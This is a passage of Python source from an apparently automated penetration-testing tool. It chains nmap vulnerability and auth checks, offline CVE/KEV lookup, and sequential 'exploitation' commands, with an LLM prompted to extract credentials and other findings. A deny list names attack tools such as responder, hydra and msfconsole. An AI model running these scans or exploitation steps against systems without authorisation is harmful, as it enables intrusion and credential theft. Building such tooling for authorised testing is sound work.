                except subprocess.TimeoutExpired:
                    proc.kill()
                break
            time.sleep(0.3)
        try:
            out, _err = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, _err = proc.communicate()
        except Exception:                        # noqa: BLE001
            out = ""
        results[i] = out or ""

    threads = [threading.Thread(target=_pass, args=(i, args), daemon=True)
               for i, (_label, args) in enumerate(specs)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    cancelled = bool(cancel is not None and cancel.is_set())
    outs = [r for r in results if r and not r.startswith("\x00")]
    if not outs:
        err = ("nmap not installed" if all(r == "\x00missing" for r in results)
               else "scan error")
        return {"ok": False, "cancelled": cancelled, "timed_out": any(hit),
                "services": [], "scripts": [], "os": None, "error": err}

    services, scripts, os_name = [], [], None
    for r in outs:
        parsed = _parse_nmap_service_xml(r)
        services += parsed["services"]
        scripts += parsed["scripts"]
        os_name = os_name or parsed["os"]
    return {"ok": True, "cancelled": cancelled, "timed_out": any(hit),
            "services": services, "scripts": scripts, "os": os_name, "error": ""}


# ── phase 3 — vuln scan ───────────────────────────────────────────────────────
# Targeted NSE driven by the services already in the DB (not a blind --script vuln):
# each open port maps to only the relevant active CVE checks (vuln category) plus
# auth-weakness checks (anonymous / empty / default creds — never brute). SSL scripts
# run on any TLS-wrapped port. brute / dos / exploit and host-crashers are excluded.
# Mirrors pshunter's phase-3 script set. Findings in the NSE `vuln` format
# (State: VULNERABLE) or an auth script's mere output become findings.
_VULN_SSL = "ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params"
_VULN_SCRIPTS = {
    "microsoft-ds": "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-vuln-ms10-061,smb-vuln-cve2009-3103,smb-double-pulsar-backdoor,"
                    "smb-security-mode,smb2-security-mode,smb-enum-users",
    "netbios-ssn":  "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-security-mode,smb-enum-users",
    "http":         "http-shellshock,http-vuln-cve2017-5638,http-vuln-cve2015-1635,"
                    "http-vuln-cve2014-3704,http-vuln-cve2012-1823,http-vuln-cve2017-1001000,"
                    "http-vuln-misfortune-cookie,http-default-accounts",
    "ms-wbt-server": "rdp-ntlm-info",
    "ftp":          "ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-anon",
    "ssh":          "ssh-auth-methods,ssh-publickey-acceptance",
    "telnet":       "telnet-encryption",
    "smtp":         "smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764",
    "mysql":        "mysql-vuln-cve2012-2122,mysql-empty-password",
    "ms-sql":       "ms-sql-empty-password",
    "oracle":       "oracle-enum-users",
    "mongodb":      "mongodb-databases",
    "redis":        "redis-info",
    "vnc":          "realvnc-auth-bypass,vnc-info,vnc-title",
    "snmp":         "snmp-info",
    "x11":          "x11-access",
    "rmi":          "rmi-vuln-classloader",
    "rsync":        "rsync-list-modules",
    "distcc":       "distcc-cve2004-2687",
    "clamav":       "clamav-exec",
    "irc":          "irc-unrealircd-backdoor",
}
_VULN_PORT_FALLBACK = {
    445: "microsoft-ds", 139: "netbios-ssn", 80: "http", 443: "http", 8080: "http",
    8443: "http", 3389: "ms-wbt-server", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    465: "smtp", 587: "smtp", 3306: "mysql", 1433: "ms-sql", 1521: "oracle",
    27017: "mongodb", 6379: "redis", 5900: "vnc", 161: "snmp", 1099: "rmi", 873: "rsync",
    3632: "distcc", 3310: "clamav", 6667: "irc", 6000: "x11", 6001: "x11",
}
_VULN_TLS_PORTS = {443, 465, 563, 636, 853, 990, 992, 993, 995, 8443}
# Auth-category scripts whose mere output is a weakness → a one-line title each.
_VULN_AUTH_TITLE = {
    "ftp-anon": "anonymous FTP login allowed",
    "mysql-empty-password": "MySQL account with empty password",
    "ms-sql-empty-password": "MSSQL account with empty password",
    "http-default-accounts": "default web credentials found",
    "x11-access": "X11 server open (no auth)",
    "redis-info": "Redis reachable without auth",
    "mongodb-databases": "MongoDB reachable without auth",
    "rsync-list-modules": "rsync modules listable",
    "snmp-info": "SNMP readable (default community)",
}


def _vuln_key(name, port: int):
    """Map a service name / port to its vuln-script family key, or None."""
    if name:
        low = name.lower()
        for key in _VULN_SCRIPTS:
            if key in low:
                return key
    return _VULN_PORT_FALLBACK.get(port)


def _vuln_families(base_dir: str, tid: int) -> list:
    """Group the target's open TCP ports into (label, scripts, [ports]) families so
    each family runs one targeted scan. SSL scripts are added for TLS-wrapped ports."""
    groups: dict = {}
    for row in purragent_db.fetch_ports(base_dir, tid):
        if (row.get("proto") or "tcp") != "tcp":
            continue                                  # vuln script set targets TCP
        port, name = row["port"], row.get("service")
        key = _vuln_key(name, port)
        if key:
            groups.setdefault(key, [_VULN_SCRIPTS[key], set()])[1].add(port)
        low = (name or "").lower()
        if port in _VULN_TLS_PORTS or "ssl" in low or "https" in low or "tls" in low:
            groups.setdefault("ssl", [_VULN_SSL, set()])[1].add(port)
    return [(k, sc, sorted(ps)) for k, (sc, ps) in groups.items() if ps]


def _extract_vuln_finding(sid, output):
    """One NSE script result → a finding dict {state, risk, cve, summary}, or None.
    Covers the standard vuln library format (State: VULNERABLE / LIKELY) and auth
    scripts whose mere output implies a weakness."""
    if not output:
        return None
    cves = sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", output)))
    cve = ",".join(cves) or None
    if re.search(r"State:\s*VULNERABLE", output):
        state = "VULNERABLE"
    elif re.search(r"State:\s*LIKELY VULNERABLE", output):
        state = "LIKELY"
    else:
        state = None
    if state:
        m = re.search(r"Risk factor:\s*([A-Za-z]+)", output)
        risk = m.group(1).upper() if m else "HIGH"
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()]
        summary = sid
        for i, ln in enumerate(lines):
            if re.match(r"(LIKELY )?VULNERABLE:?$", ln, re.I) and i + 1 < len(lines):
                nxt = lines[i + 1]
                if not re.match(r"(State|IDs|Risk|Disclosure|References|Description|"
                                r"Extra)\b", nxt):
                    summary = nxt
                break
        return {"state": state, "cve": cve, "risk": risk, "summary": summary[:140]}
    if sid in _VULN_AUTH_TITLE:
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": _VULN_AUTH_TITLE[sid]}
    return None


def _parse_nmap_vuln_xml(xml_str: str) -> list:
    """Parse `nmap -oX -` phase-3 output → [{port, proto, script, state, risk, cve,
    summary}]. Port scripts carry their port; host scripts get port 0."""
    import xml.etree.ElementTree as ET
    out = []
    try:
        root = ET.fromstring(xml_str)
    except (ET.ParseError, TypeError):
        return out
    for host in root.iter("host"):
        for port in host.iter("port"):
            try:
                pnum = int(port.get("portid"))
            except (TypeError, ValueError):
                continue
            proto = port.get("protocol", "tcp")
            for scr in port.findall("script"):
                f = _extract_vuln_finding(scr.get("id"), scr.get("output") or "")
                if f:
                    f.update({"port": pnum, "proto": proto, "script": scr.get("id")})
                    out.append(f)
        hs = host.find("hostscript")
        if hs is not None:
            for scr in hs.findall("script"):
                f = _extract_vuln_finding(scr.get("id"), scr.get("output") or "")
                if f:
                    f.update({"port": 0, "proto": "tcp", "script": scr.get("id")})
                    out.append(f)
    return out


def _run_one_vuln_pass(scripts: str, ports: list, ip: str, cancel) -> dict:
    """Run ONE family's targeted vuln/auth scan. Cancellable + time-budgeted; keeps
    partial output. Returns {ok, findings, cancelled, timed_out, error}."""
    args = ["-sV", "--script", scripts, "-Pn", "-n", "-T3", "--script-timeout",
            "120s", "-oX", "-", "-p", ",".join(str(p) for p in ports)]
    deadline = PORT_SCAN_MINUTES * 60
    try:
        proc = subprocess.Popen(["nmap"] + args + [ip], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True)
    except FileNotFoundError:
        return {"ok": False, "findings": [], "cancelled": False, "timed_out": False,
                "error": "nmap not installed"}
    start, timed_out = time.time(), False
    while proc.poll() is None:
        if cancel is not None and cancel.is_set():
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            break
        if (time.time() - start) > deadline:
            timed_out = True
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            break
        time.sleep(0.3)
    try:
        out, _err = proc.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _err = proc.communicate()
    except Exception:                                 # noqa: BLE001
        out = ""
    return {"ok": True, "findings": _parse_nmap_vuln_xml(out or ""),
            "cancelled": bool(cancel is not None and cancel.is_set()),
            "timed_out": timed_out, "error": ""}


def _start_vuln_scan(eng: dict) -> None:
    """Phase 3 entry (runs on the print thread from _finish_engagement): one concurrent
    targeted scan per service family. No families → skip straight to phase 4."""
    with eng["lock"]:
        if eng["cancelled"]:
            return
        families = _vuln_families(eng["base_dir"], eng["tid"])
        jobs = []
        if families:
            vuln_phase = {"phase": "vuln scan", "ip": eng["ip"], "jobs": []}
            for fam, scripts, ports in families:
                label = f"{fam} vuln scan"
                cmd = ("nmap -sV --script " + scripts + " -T3 -p "
                       + ",".join(str(p) for p in ports) + " " + eng["ip"])
                job = _job(cmd)
                vuln_phase["jobs"].append(job)
                jobs.append((label, scripts, ports, job))
            eng["vuln_phase"] = vuln_phase
            eng["ctx"].setdefault("phases", []).append(vuln_phase)
        else:
            eng["vuln_advanced"] = True
            console.print(_phase_banner(3, "vuln scan"))
            console.print(Text("    no services with known vuln checks — skipping",
                               style="bright_black"))
    if not jobs:                                       # nothing to scan → phase 4
        _start_cve_lookup(eng)
        return
    for label, scripts, ports, job in jobs:                      # announce each family
        n = _next_seq(eng)
        console.print(_phase_banner(3, label, num=n, cmd=job["command"]))
        threading.Thread(target=_vuln_pass,
                         args=(eng, label, scripts, ports, job, n), daemon=True).start()


def _vuln_pass(eng: dict, label: str, scripts: str, ports: list, job: dict,
               num: int) -> None:
    """One phase-3 family scan; stores its findings and advances when the phase is
    fully done."""
    result = _run_one_vuln_pass(scripts, ports, eng["ip"], job["cancel"])
    with eng["lock"]:
        try:
            for f in result.get("findings", []):
                purragent_db.add_vuln(eng["base_dir"], eng["tid"], f["port"],
                                      f["proto"], f["script"], f["state"],
                                      f["risk"], f["cve"], f["summary"])
        except Exception:                             # noqa: BLE001
            pass
        eng["vuln_findings"] += result.get("findings", [])
        job["state"] = ("aborted" if result.get("cancelled")
                        else "error" if not result.get("ok") else "complete")
        st = job["state"]
    real = [f for f in result.get("findings", [])
            if f.get("state") in ("VULNERABLE", "LIKELY", "EXPOSED")]
    finds = "; ".join(f.get("summary") or f.get("script") or "" for f in real)
    _post(eng["ctx"], lambda s=st, f=finds, nm=num:
          _print_cmd_outcome(3, label, s, f, num=nm))
    _maybe_finish_vuln(eng)


def _maybe_finish_vuln(eng: dict) -> None:
    """Advance to phase 4 once every vuln family scan has finished."""
    with eng["lock"]:
        if eng["vuln_advanced"] or eng["vuln_phase"] is None:
            return
        if any(j["state"] == "running" for j in eng["vuln_phase"]["jobs"]):
            return
        eng["vuln_advanced"] = True
    _post(eng["ctx"], lambda: _finish_vuln_scan(eng))


def _finish_vuln_scan(eng: dict) -> None:
    with eng["lock"]:
        if eng["cancelled"]:
            return
    _start_cve_lookup(eng)                             # phase 4 — CVE lookup


# ── phase 4 — CVE lookup ──────────────────────────────────────────────────────
# Offline enrichment: phase 2 stored a CPE per service; here we match that CPE
# (vendor/product + version) against the local NVD-derived index (appdata/
# cve_index.db) and record the known CVE numbers as findings. No network, no
# scanning — pure lookup. Only versioned CPEs are used (a general CPE without a
# version can't be mapped precisely and would produce false positives). The matcher
# is deliberately strict (exact-precision gate + closed ranges only) — fewer but
# better-verified CVEs, less noise. Mirrors pshunter's phase-4 CVE lookup.
_CVE_STORE_CAP = 20        # newest CVEs kept per service (keeps findings readable)

# The same product often carries a different CPE vendor/product in nmap output than
# the one(s) NVD files its CVEs under. Map the nmap pair to the canonical NVD pair(s)
# that actually hold the CVEs; the lookup queries the original AND every alias and
# unions the results, so nothing is silently missed.
_CPE_ALIAS = {
    ("mysql", "mysql"):                 [("oracle", "mysql")],
    ("nginx", "nginx"):                 [("f5", "nginx")],
    ("igor_sysoev", "nginx"):           [("f5", "nginx")],
    ("elasticsearch", "elasticsearch"): [("elastic", "elasticsearch")],
    ("squid", "squid"):                 [("squid-cache", "squid")],
    ("isc", "bind9"):                   [("isc", "bind")],
    ("vsftpd", "vsftpd"):               [("redhat", "vsftpd")],
    ("proftpd", "proftpd"):             [("proftpd_project", "proftpd")],
    ("rabbitmq", "rabbitmq"):           [("pivotal_software", "rabbitmq"),
                                         ("broadcom", "rabbitmq_server")],
    ("pureftpd", "pureftpd"):           [("pureftpd", "pure-ftpd")],
}


def _cve_index_path(base_dir: str) -> str:
    return os.path.join(base_dir, "appdata", "cve_index.db")


_KEV_CACHE = None


def _load_kev(base_dir: str) -> set:
    """The CISA KEV set — CVE ids actually exploited in the wild (bundled kev.txt,
    one CVE per line). Cached; empty if the file is missing. A matched CVE that is in
    this set is 'well-known' (known-exploited), the rest are 'other'."""
    global _KEV_CACHE
    if _KEV_CACHE is None:
        kev = set()
        try:
            with open(os.path.join(base_dir, "appdata", "kev.txt"),
                      encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("CVE-"):
                        kev.add(line)
        except OSError:
            pass
        _KEV_CACHE = kev
    return _KEV_CACHE


def _ver_key(v) -> tuple:
    """Version as a tuple of its numeric components, e.g. '8.2p1' → (8, 2, 1)."""
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _ver_cmp(a, b) -> int:
    """-1 / 0 / 1 comparing two version strings by their numeric components."""
    ta, tb = _ver_key(a), _ver_key(b)
    n = max(len(ta), len(tb))
    ta += (0,) * (n - len(ta))
    tb += (0,) * (n - len(tb))
    return (ta > tb) - (ta < tb)


def _cve_sort_key(cve: str) -> tuple:
    """Sort CVE ids newest-first (by year, then sequence)."""
    m = re.match(r"CVE-(\d+)-(\d+)", cve)
    return (-int(m.group(1)), -int(m.group(2))) if m else (0, 0)


def _cpe_parts(cpe):
    """(vendor, product, version) from a CPE 2.2 (cpe:/a:v:p:ver) or 2.3
    (cpe:2.3:a:v:p:ver:…) URI. version is None when absent/any ('*'/'-')."""
    if not cpe or not cpe.startswith("cpe:"):
        return None
    body = cpe[4:]
    if body.startswith("/"):                           # 2.2
        f = body[1:].split(":")
    elif body.startswith("2.3:"):                      # 2.3
        f = body[4:].split(":")
    else:
        return None
    if len(f) < 3:
        return None
    vendor, product = f[1], f[2]
    version = f[3] if len(f) > 3 else None
    version = None if version in ("", "*", "-") else version
    if not vendor or not product:
        return None
    return vendor, product, version


def _ver_in_match(version, exact, vsi, vse, vei, vee) -> bool:
    """True when ``version`` satisfies one NVD cpeMatch row — deliberately strict:
      • exact version: matched only when the fingerprint is at least as precise as
        the exact value (a bare major like '4' is NOT taken as '4.0.0').
      • ranges: only *closed* ranges (a start AND an end bound) count, and only for a
        fingerprint with ≥2 numeric components. Open-ended rows are dropped."""
    vk = _ver_key(version)
    if exact:
        ek = _ver_key(exact)
        if len(vk) < len(ek):
            return False                   # fingerprint too coarse to claim this
        n = max(len(vk), len(ek))
        return vk + (0,) * (n - len(vk)) == ek + (0,) * (n - len(ek))
    if len(vk) < 2:
        return False                       # bare major — too coarse for a range
    if not ((vsi or vse) and (vei or vee)):
        return False                       # open-ended / unbounded range — dropped
    if vsi and _ver_cmp(version, vsi) < 0:
        return False
    if vse and _ver_cmp(version, vse) <= 0:
        return False
    if vei and _ver_cmp(version, vei) > 0:
        return False
    if vee and _ver_cmp(version, vee) >= 0:
        return False
    return True


def _cve_lookup(base_dir: str, vendor: str, product: str, version: str):
    """Matching CVEs for one vendor/product/version, split into KEV vs other, or None
    when the index is missing/unreadable. Queries the CPE pair plus any aliases.
    Returns (kev, other): kev are CVEs in the CISA Known-Exploited set (actually
    exploited in the wild — the ones that matter most); other are the rest. Both go
    through the strict version matcher first, so false positives are already cut."""
    import sqlite3
    path = _cve_index_path(base_dir)
    if not os.path.exists(path):
        return None
    targets = [(vendor, product)] + _CPE_ALIAS.get((vendor, product), [])
    try:
        con = sqlite3.connect(path)
        try:
            rows = []
            for av, ap in targets:
                rows += con.execute(
                    "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve "
                    "FROM cve_match m JOIN product p ON p.id = m.product_id "
                    "WHERE p.vendor = ? AND p.product = ?", (av, ap)).fetchall()
        finally:
            con.close()
    except sqlite3.Error:
        return None
    matched = {cve for exact, vsi, vse, vei, vee, cve in rows
               if _ver_in_match(version, exact, vsi, vse, vei, vee)}
    kev_set = _load_kev(base_dir)
    kev = sorted((c for c in matched if c in kev_set), key=_cve_sort_key)
    other = sorted((c for c in matched if c not in kev_set), key=_cve_sort_key)
    return kev, other


def _run_cve_lookup(base_dir: str, tid: int, cancel=None) -> list:
    """Per versioned service CPE on the target, the CVEs it maps to, split into KEV vs
    other. Returns [(port, proto, product, version, kev, other), …]."""
    results = []
    for row in purragent_db.fetch_ports(base_dir, tid):
        if cancel is not None and cancel.is_set():
            break
        parts = _cpe_parts(row.get("cpe"))
        if not parts:
            continue
        vendor, product, cpe_ver = parts
        version = cpe_ver or row.get("version")
        if not version or not re.search(r"\d", version):
            continue                                   # need a concrete version
        found = _cve_lookup(base_dir, vendor, product, version)
        if not found:
            continue
        kev, other = found
        if kev or other:
            results.append((row["port"], row.get("proto") or "tcp", product,
                            version, kev, other))
    return results


def _start_cve_lookup(eng: dict) -> None:
    """Phase 4 entry: a single offline lookup job (no scanning). Runs in the
    background so btw / /status stay responsive, then closes out the recon."""
    with eng["lock"]:
        if eng["cancelled"]:
            return
        job = _job("cve-index lookup (offline NVD)  ·  " + eng["ip"])
        eng["cve_phase"] = {"phase": "cve lookup", "ip": eng["ip"], "jobs": [job]}
        eng["ctx"].setdefault("phases", []).append(eng["cve_phase"])
    eng["cve_num"] = _next_seq(eng)
    console.print(_phase_banner(4, "CVE lookup", budget=False, num=eng["cve_num"]))
    console.print(Text("    matching service CPEs against the offline NVD index",
                       style="bright_black"))
    threading.Thread(target=_cve_pass, args=(eng, job), daemon=True).start()


def _cve_pass(eng: dict, job: dict) -> None:
    """Run the offline lookup, store one 'cve-lookup' finding per service, close out."""
    base, tid = eng["base_dir"], eng["tid"]
    no_index = not os.path.exists(_cve_index_path(base))
    results = [] if no_index else _run_cve_lookup(base, tid, job["cancel"])
    with eng["lock"]:
        try:
            for port, proto, product, version, kev, other in results:
                cve_str = ",".join((kev + other)[:_CVE_STORE_CAP])   # KEV first
                summary = (f"{product} {version} — {len(kev)} KEV + "
                           f"{len(other)} other CVE")
                purragent_db.add_vuln(base, tid, port, proto, "cve-lookup",
                                      "CVE", "INFO", cve_str, summary)
        except Exception:                              # noqa: BLE001
            pass
        eng["cve_results"], eng["cve_no_index"] = results, no_index
        job["state"] = ("aborted" if job["cancel"].is_set()
                        else "error" if no_index else "complete")
    _post(eng["ctx"], lambda: _finish_cve_lookup(eng))


def _finish_cve_lookup(eng: dict) -> None:
    with eng["lock"]:
        if eng["cancelled"]:
            return
        results, no_index = list(eng.get("cve_results") or []), eng.get("cve_no_index")
    _cve_outcome(results, no_index, eng.get("cve_num"))
    _start_targeted_review(eng)                        # phase 4.5 → then phase 5


def _cve_outcome(results: list, no_index: bool, num=None) -> None:
    """Phase-4 outcome: counts only — how many KEV (CISA known-exploited) vs other
    CVEs per service. The CVE ids themselves are stored as findings (see /target),
    not listed here. A [complete]/[failed] state line leads, like the other phases."""
    if no_index:
        console.print(_phase_state_line(4, "CVE lookup", "error", num=num))
        console.print(Text("  ○ CVE lookup — offline NVD index not present "
                           "(appdata/cve_index.db)", style="bright_black"))
        return
    console.print(_phase_state_line(4, "CVE lookup", "complete", num=num))
    if not results:
        console.print(Text("  ○ CVE lookup — no versioned service CPE matched the "
                           "index", style="bright_black"))
        return
    tkev = sum(len(r[4]) for r in results)
    tother = sum(len(r[5]) for r in results)
    console.print(Text(f"  ✓ CVE lookup — {len(results)} service(s): {tkev} "
                       f"KEV (known-exploited), {tother} other", style="green"))
    for port, proto, product, version, kev, other in results[:8]:
        line = Text("      ")
        line.append(f"{port:<5}", style="default")
        line.append(f" {product} {version}".rstrip(), style="default")
        line.append(f"  —  {len(kev)} KEV", style="red" if kev else "bright_black")
        line.append(f", {len(other)} other", style="bright_black")
        console.print(line)
        if kev:                                        # list the known-exploited ids
            shown = ", ".join(kev[:10])
            more = f"  (+{len(kev) - 10} more)" if len(kev) > 10 else ""
            console.print(Text("        " + shown + more, style="green"))
    if len(results) > 8:
        console.print(Text(f"      … and {len(results) - 8} more service(s)",
                           style="bright_black"))


# ── phase 5 — service exploitation ────────────────────────────────────────────
# Sequential, no LLM for control flow: walk the target's services in pshunter's
# exploitation-priority order, and for each service walk its checklist sub-phases and
# their commands in order (all reused from pshunter's catalog). SAFE-by-default: a
# command runs only when every placeholder resolves to the target itself (<RHOST> /
# <RPORT>) and its tool is installed — so creds / listener / destructive commands are
# skipped for now. Each run gets a per-command time budget; its output is sent to the
# LLM (tool-free) to extract the important bits, which are stored under the port.
_EXPLOIT_FILL_OK = re.compile(r"<[A-Za-z]")        # any leftover <PLACEHOLDER> → unrunnable

# Tools that are active attacks, listeners/relays, crackers or brute-forcers — never
# auto-run in this simple pass even if their placeholders happen to resolve (some use
# literal helper files). They poison, hang, crack or spray; they belong to manual work.
_EXPLOIT_DENY_BINS = {
    "responder", "ntlmrelayx", "impacket-ntlmrelayx", "mitm6", "coercer",
    "petitpotam", "printerbug", "pre2k",
    "hashcat", "john", "hydra", "medusa", "patator", "ncrack", "kerbrute",
    "msfconsole", "msfvenom",
}


def _exploit_cmd_safe(cmd: str) -> bool:
    """False for commands we must not auto-run: denylisted attack/crack/relay tools, a
    custom .py script we don't ship, or anything pointed at a wordlist (brute-force /
    password spray, not enumeration)."""
    low = cmd.lower()
    if any(w in low for w in ("rockyou", "/wordlists/", "seclists")):
        return False                                   # brute-force / spray
    try:
        toks = shlex.split(cmd)
    except ValueError:
        toks = cmd.split()
    i = 0
    while i < len(toks) and toks[i] in ("sudo", "env"):
        i += 1
    if i >= len(toks):
        return False
    base = os.path.basename(toks[i]).lower()
    if base in _EXPLOIT_DENY_BINS:
        return False
    if base in ("python", "python2", "python3") and i + 1 < len(toks) \
            and toks[i + 1].endswith(".py"):
        return False                                   # script we don't provide
    return True


CURL_MAX_TIME_SECONDS = 60         # cap each curl request so it can't stall the budget


def _inject_curl_max_time(cmd: str) -> str:
    """Add `--max-time N` to a curl invocation that lacks its own request cap, so a
    silently-held connection exits on its own well before the phase-5 process budget."""
    if not re.search(r"(?:^|[|;&]\s*|\s)curl\b", cmd):
        return cmd
    if re.search(r"(?:--max-time|--connect-timeout|\s-m\s)", cmd):
        return cmd                                     # already time-bounded
    return re.sub(r"\bcurl\b", f"curl --max-time {CURL_MAX_TIME_SECONDS}", cmd, count=1)


def _fill_exploit_cmd(cmd: str, ip: str, port: int):
    """Fill <RHOST>/<RPORT>/<IP> from the target, drop trailing comments, and return the
    runnable command — or None if it's a comment, still has unresolved placeholders, or
    would widen scope beyond the single host (a <RHOST>/24 sweep)."""
    if "<RHOST>/" in cmd or "<RHOST> /" in cmd:        # subnet sweep → out of scope
        return None
    cmd = re.split(r"\s+#", cmd, maxsplit=1)[0].strip()   # strip trailing comment
    if not cmd or cmd.startswith("#"):
        return None
    out = (cmd.replace("<RHOST>", ip).replace("<RPORT>", str(port))
              .replace("<IP>", ip).replace("<PORT>", str(port)))
    if _EXPLOIT_FILL_OK.search(out):                   # unresolved placeholder remains
        return None
    return _inject_curl_max_time(out)


def _cmd_binary(cmd: str):
    """The tool a command actually invokes (skipping a leading sudo/env), for a
    which-check."""
    try:
        toks = shlex.split(cmd)
    except ValueError:
        toks = cmd.split()
    if not toks:
        return None
    b = toks[0]
    if b in ("sudo", "env") and len(toks) > 1:
        b = toks[1]
    return b


def _kill_proc_group(proc) -> None:
    """Terminate a shell command and its children (it may spawn a pipeline)."""
    for sig in (signal.SIGTERM, signal.SIGKILL):
        try:
            os.killpg(os.getpgid(proc.pid), sig)
        except Exception:                              # noqa: BLE001
            try:
                proc.terminate() if sig == signal.SIGTERM else proc.kill()
            except Exception:                          # noqa: BLE001
                pass
        try:
            proc.wait(timeout=3)
            return
        except Exception:                              # noqa: BLE001
            continue


def _run_exploit_cmd(cmd: str, cancel) -> dict:
    """Run one exploitation command (shell), cancellable + time-budgeted, stdin closed
    so interactive tools exit on EOF. Returns {ok, output, cancelled, timed_out}."""
    deadline = EXPLOIT_CMD_MINUTES * 60
    try:
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.DEVNULL,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, start_new_session=True)
    except Exception as exc:                           # noqa: BLE001
        return {"ok": False, "output": str(exc), "cancelled": False,
                "timed_out": False}
    start, timed_out = time.time(), False
    while proc.poll() is None:
        if cancel is not None and cancel.is_set():
            _kill_proc_group(proc)
            break
        if (time.time() - start) > deadline:
            timed_out = True
            _kill_proc_group(proc)
            break
        time.sleep(0.3)
    try:
        out, _e = proc.communicate(timeout=5)
    except Exception:                                  # noqa: BLE001
        _kill_proc_group(proc)
        try:
            out, _e = proc.communicate(timeout=5)
        except Exception:                              # noqa: BLE001
            out = ""
    return {"ok": proc.returncode == 0, "output": out or "",
            "returncode": proc.returncode,
            "cancelled": bool(cancel is not None and cancel.is_set()),
            "timed_out": timed_out}


def _exploit_fail_reason(result: dict) -> str:
    """A short, deterministic explanation for a failed phase-5 command — the exit code
    plus the last non-empty line of its (stderr-merged) output. No LLM: the reason is
    already in the exit status and stderr, so we just surface it."""
    if result.get("timed_out"):
        return f"timed out ({EXPLOIT_CMD_MINUTES}m budget)"
    rc = result.get("returncode")
    tail = next((ln.strip() for ln in reversed((result.get("output") or "").splitlines())
                 if ln.strip()), "")
    code = f"exit {rc}" if rc is not None else "failed"
    if not tail:
        return f"{code} · (no output — likely no match / closed port / missing file)"
    return f"{code} · {tail[:200] + '…' if len(tail) > 200 else tail}"


_EXPLOIT_EXTRACT_SYSTEM = (
    "You are a penetration-testing assistant. You are given the raw output of a single "
    "enumeration command run against one service. Extract ONLY the security-relevant "
    "facts: credentials, usernames, shares, versions, hostnames/domains, readable or "
    "writable files/paths, misconfigurations, and anything directly actionable. Be "
    "terse — a few short lines, no preamble, no advice. If there is nothing useful, "
    "reply with exactly: NONE")


def _finding_tokens(text: str) -> set:
    return set(re.sub(r"[^a-z0-9 ]", " ", (text or "").lower()).split())


def _is_dup_finding(new: str, existing: list) -> bool:
    """True when `new` adds essentially nothing over one of the existing findings —
    ≥85% of its words already appear there (light, order-insensitive dedup)."""
    nt = _finding_tokens(new)
    if not nt:
        return True
    for e in existing:
        et = _finding_tokens(e)
        if et and len(nt & et) / len(nt) >= 0.85:
            return True
    return False


def _extract_exploit_finding(eng: dict, port: int, service: str, step: str,
                             cmd: str, output: str):
    """Send one command's output to the LLM (tool-free) and return the extracted
    finding text, or None (no model / nothing useful / error). The findings already
    recorded for this port are shown to the model so it only reports NEW facts (dedup
    at the source — still just one call per command)."""
    profile = eng["ctx"].get("profile")
    if not profile or not output.strip():
        return None
    with eng["lock"]:
        prior = [f["finding"] for f in eng.get("exploit_findings", [])
                 if f.get("port") == port and f.get("finding")]
    system = _EXPLOIT_EXTRACT_SYSTEM
    if prior:
        system += ("\n\nAlready recorded for this port — do NOT repeat any of these; "
                   "report only genuinely NEW facts, or NONE:\n"
                   + "\n".join("- " + p for p in prior[-12:]))
    user = (f"Service {port}/{service} · step: {step}\n$ {cmd}\n\n"
            f"Output:\n{output[:6000]}")
    body = {"model": profile.get("model", ""),
            "messages": [{"role": "system", "content": system},
                         {"role": "user", "content": user}],
            "temperature": AGENT_TEMPERATURE}
    custom_params = psai._parse_custom_params(profile)
    if custom_params:
        body.update(custom_params)
    try:
        endpoint, api_key = _openai_endpoint(profile, eng["base_dir"])
        parts: list = []
        _chat_stream(endpoint, api_key, body, lambda t: parts.append(t),
                     hide_thinking=True, render_reasoning=False,
                     max_seconds=EXTRACT_TURN_MAX_SECONDS)
    except Exception:                                  # noqa: BLE001
        return None
    text = "".join(parts).strip()
    if not text or text.upper().startswith("NONE"):
        return None
    return text


def _exploit_order(base_dir: str, tid: int) -> list:
    """The target's open ports in pshunter's exploitation-priority order, each resolved
    to a service class. Returns [(port, proto, label, key, ver), …]."""
    import pshunter
    triaged = []
    for r in purragent_db.fetch_ports(base_dir, tid):
        port, proto = r["port"], r.get("proto") or "tcp"
        label, key, _sig = pshunter._classify_service(
            port, r.get("service"), r.get("product"), r.get("version"), r.get("cpe"))
        rank = pshunter._EXPLOIT_RANK.get(key, len(pshunter._EXPLOIT_SERVICES))
        ver = " ".join(x for x in (r.get("product"), r.get("version")) if x)
        triaged.append((rank, port, proto, label, key, ver))
    triaged.sort(key=lambda t: (t[0], t[1]))
    return [(p, pr, lb, k, v) for _r, p, pr, lb, k, v in triaged]


# ── phase 4.5 — targeted review (LLM, hacktools only) ─────────────────────────
# After the deterministic recon (phases 1-4) the model gets the full findings and
# may run a FEW precise extra checks from the hacktools MCP server (product-specific
# NSE, nuclei by tag, a deeper probe of an unidentified service) — a bounded agentic
# loop, not one call: it reacts to each tool's output, then summarises and stops.
# Tightly capped (rounds / tool-calls / wall-clock) because each call is a real scan
# and small models drift. Skipped cleanly with no model / MCP / hacktools; either way
# the engagement then proceeds to phase 5 exactly as before.
REVIEW_MAX_ROUNDS = 4
REVIEW_MAX_TOOLCALLS = 6
REVIEW_BUDGET_MINUTES = 8

# Phase 4.5 is a review of the NMAP recon only: the model gets just the nmap-based
